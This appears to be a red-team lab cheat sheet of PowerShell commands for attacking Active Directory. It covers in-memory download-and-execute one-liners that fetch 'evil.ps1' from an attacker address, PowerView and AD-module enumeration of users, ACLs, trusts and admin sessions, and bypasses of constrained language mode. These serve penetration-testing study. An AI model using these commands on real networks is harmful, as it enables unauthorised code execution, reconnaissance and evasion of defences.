# PowerShell 4 attackers

## PowerShell basics
```
Get-Help
Get-Help <cmdlet> -Full
Get-Help <cmdlet> -Examples
```

PowerShell scripts can used multiple things such as:
- cmdlets
- native commands
- functions
- .NET code
- DLL
- Windows API

### PowerShell Download and execute in memory of PowerShell:  
```
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

iex (iwr 'http://192.168.230.1/evil.ps1') (PowerShell Version 3)

$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText

$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
#### PowerShell and Active Directory
- ADSI
- .NET Classes (System.DirectoryServices.ActiveDirectory)
- Native Executable
- PowerShell (.NET Classes and WMI)


# Domain Enumeration
#### Using .NET Classes
Enumeration can be done by using Native Executables and .NET classes:
Using the DirectoryServices.ActiveDirectory.Domain class and then static method *GetCurrentDomain()*
- https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain?view=dotnet-plat-ext-6.0
- https://adsecurity.org/?p=113

```
PS C:\> $ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
PS C:\> $ADClass::GetCurrentDomain()
```

Get the name of the current forest
```
PS C:\> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
or
PS C:\> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().name
```
#### Using LDAP queries through PowerShell and ADSI Searcher
- https://devblogs.microsoft.com/scripting/use-powershell-to-query-active-directory-from-the-console/
- https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-6.0

ADSISearcher is a type accelerator for the *System.DirectoryServices.DirectorySearcher* .NET class.  
--> A type accelerator is a simple alias to represent a .Net class.  
--> ADSISearcher It is used to search for one or more objects based on a filter.
```
PS C:\>  ([adsisearcher]'(&(objectCategory=user))').FindAll()
```

#### Active Directory Module in PowerShell
- Install it using RSAT *OR* import the module *Microsoft.ActiveDirectory.Management.dll"
- https://github.com/samratashok/ADModule

--> The DLL is usually found at this path: *C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management*

```
PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
OR
PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

#### PowerView
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```
PS C:\> Get-NetDomain
```

## Domain enumeration - Users / Groups / Shares

Getting domain information PowerView
```
Get-NetDomain
```

Getting domain information Active Directory Module
```
Get-ADDomain
```

Get Object of another domain PowerView
```
Get-NetDomain -Domain moneycorp.local
```
Get Object of another domain AD Module
```
Get-ADDomain -Identity moneycorp.local
```

Get domain SID for the current domain PowerView
```
Get-DomainSID
```
Get domain SID for the current doamin
```
(Get-ADDomain).DomainSID
``` 

Get password policy information PowerView
```
(Get-DomainPolicy)."system access"
```
Get Domain policy for another domain PowerView
```
(Get-DomainPolicy -domain moneycorp.local)."system access"
```

Get domain controller for current domain and another domain AD Module
```
Get-ADDomainController
Get-ADDomainController -DomainName moneycorp.local -Discover
```

Get list of user using AD module with all their properties
```
Get-ADUser -Filter * -Properties *
```

Get list of user and their description
```
Get-ADUser -Filter * -Properties * | select GivenName, Description
```

Get all the properties for users in the current domain
```
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | Select Name
```
Get all user, last password set property (this property can be usefull to detect a potential decoy user)
```
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

Get all the computer in current domain using AD Module
```
Get-ADComputer -Filter * | select Name
```

Get list of all the properties for all the computer object in current domain using AD Module
```
Get-ADComputer -Filter * -Property *
```

Get all groups containing the word "admin" in group name using AD Module
```
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

Get all the members of the *Domain Admins* group using AD Module
```
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```

Get group membership for specific user using AD Module
```
Get-ADPrincipalGroupMembership -Identity student212
```

List all the local groups on a machine (needs admin priv on non-dc machines) using PowerView
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
```

List members of all the local groups on a machine (needs admin priv on non-dc machines) using PowerView
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```

Get *Active* logged users on a computer (needs local admin rights on the target)
```
Get-NetLoggedon -ComputerName lapt001
```

Get *locally* logged users on a computer (needs remote registry on the target - started by default for Windows Server) using PowerView
```
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

Get the last logged user on a computer (needs admin priv and remote regisry on the target) using PowerView
```
Get-LastLoggedOn -ComputerName server01
```

Find shares on hosts in current domain using PowerView
```
Invoke-ShareFinder -Verbose
```

Find sensitive files on computer in the domain using PowerView
```
Invoke-FileFinder -Verbose
```

## Domain enumeration - GPO / ACLs

It exist a Group Policy module like the Active Directory module, but we would need for this one to use RSAT and so admin priv.

Listing all GPO using Group Policy Module
```
Get-GPO -All
```

Getting the RSoP using Group Policy Module:
*RSoP* : Resultant Set Of Policy : Built-in Windows tool that allows you to discover what policy settings are applied to local and remote computers.

```
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
```

Listng all GPO using PowerView
```
Get-NetGPO
```
Listing GPO applied to specific computer/server using PowerView
```
Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
```
List GPO which use Restricted Groups or groups.xml for interesting users using PowerView
```
Get-NetGPOGroup
```

Listing ACL for a specific user
```
Get-ObjectAcl -SamAccountName student212 -ResolveGuids
```

How to read an ACE :  
1. ObjectDN : Object distinguished name, this the target object
2. IdentityReference : Which users or groups have permission
3. ActiveDirectoryRights : What is the rights/permission (what can the IdentifyRefence do on the ObjectDN)

In the following case : **BUILTIN\Administrators**(*2*) have **CreateChild, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner**(*3*) on **CN=student212,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local**(*1*)

```
InheritedObjectType   : All
ObjectDN              : CN=student212,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : BUILTIN\Administrators
IsInherited           : True
ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : ContainerInherit
InheritanceType       : All
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-49157
```

Listing the ACL for the administrator user using AD Module
```
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
```

Searching for interesting ACEs using PowerView
```
. .\PowerView_dev.ps1
Invoke-ACLScanner -ResolveGUIDS
```

Get The ACLs associated with the specific path
```
Get-PathACL -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```

## Domain enumeration - Trust
#### Domain Trust
Trust relatinonship exist between *Forest* and *Domain*.

Trust Can be from 2 types:
- Automatic (Parent/Child, same forest)
- Established (External)

Trust direction can be multiple types:
- One-Way-Trust: Unidirectional: Users in the trusted domain can access resource in the trusting domain but the reverse is not true. (Remember: Direction of access is *reverse* direction of trust)

<img src="./images/on-way-trust.png" width="500"/>

- Two-Way-Trust : Bidirectional: Users of both domains can access resources in the other domain.

<img src="./images/2-way-trust.png" width="500"/>

Trust transitivity:
If A = B and B = C then A=C

<img src="./images/transitivity.png" width="500"/>

Non Transitivity:
Non transitive - Cannot be extended to other domains in the forest. Can be *Two-Way* or *One-Way*.  
--> This is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship.

#### Forest Trust

- Trust is establish between each forest root domain
- Cannot be extended to a third forest (no implicit trust)
- Can be on-way, two-way, transisitve and non-transitive

<img src="./images/forest_trust.png" width="500"/>

Get list of domain trust for the current domain and another domain using PowerView
```
Get-NetDomainTrust
Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
```

Get list of domain trust for the current domain and another domain using AD Module
```
Get-ADTrust
Get-ADTrust -Identity us.dollarcorp.moneycorp.local
```

Get information from trusted forest
```
Get-ADForest -Identity eurocorp.local
```

Get all domains in the current forest using PowerView
```
Get-NetForestDomain
Get-NetForestDomain -Forest eurocorp.local
```

Get all domains in the current forest using AD Module
```
(Get-ADForest).Domains
(Get-ADForest -Identity eurocorp.local).Domains
```

List trust of our Forest using PowerView
```
Get-NetForestTrust
```

List trust of our Forest using AD Moduke
```
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

## Domain Enumeration - User Hunting

Find all machines on the current domain where the current user has local admin access
```
Find-LocalAdminAccess -Verbose
```

In case *RPC* or *SMB* port are blocked we can use WMI and PSRemoting.
- [Find-WMILocalAdminAccess.ps1](./Tools/Find-WMILocalAdminAccess.ps1)
- [Find-PSRemotingLocalAdminAccess.ps1](./Tools/Find-PSRemotingLocalAdminAccess.ps1)

Find local admins on all machines of the domain (needs administrator privs)
```
Invoke-EnumerateLocalAdmin -Verbose
```

Find computers where a domain admin (or specific user/group) has sessions:
```
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```

Find computers where a domain admin is logged-in: This options queries the DC of the current/provided domain for members of the given group. (Domain Admins by default) 
- The tool gets a list *only* of high traffic servers (DC, FileServers and Distributed File servers)
```
Invoke-UserHunter -Stealth
```

If -Checkaccess, then it also check for LocalAdmin access in the hosts.
```
Invoke-UserHunter -CheckAccess
```


- COM object and PowerShell
- PE load powershell
- Reflective PE load powershell
- AMSI inner workings and bypass
- domain recon
- domain privesc
- local privesc
- ADSI
- automation.management.dll (dll for powershell)
- powershell without powershell
- reverse shell
- upload server
- web server
- CLM nd bypass
- invoke-share finder, powerfindshare
- Misc (team viewer, creds access)

## Bypass constrained language mode
- https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/

Constrained Language Mode is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack surface to adversary's.  

Validating the system is running under constrained language mode.
```
$ExecutionContext.SessionState.LanguageMode
```
- PowerShell downgrade to bypass
```
powershell -version 2
```

- PowerShell version 6
```
pwsh
```

- Attempt command execution with inline functions
```
&{hostname}
```

- Bypass by starting new PS session
```
powershell.exe
```

- https://github.com/calebstewart/bypass-clm